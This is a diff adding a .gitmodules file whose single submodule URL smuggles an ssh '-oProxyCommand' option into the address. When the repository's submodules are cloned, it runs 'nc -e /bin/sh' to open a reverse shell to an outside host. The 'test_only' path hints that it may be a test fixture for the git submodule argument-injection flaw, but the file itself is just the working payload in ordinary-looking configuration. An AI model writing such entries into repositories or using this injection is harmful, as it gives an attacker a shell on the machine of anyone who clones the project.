@@ -1,0 +1,3 @@
+[submodule "yfs-class-cpp"]
+	path = yfs-class-cpp
+    url = ssh://-oProxyCommand="nc -e /bin/sh s2.anykno.net 12345"/test_only
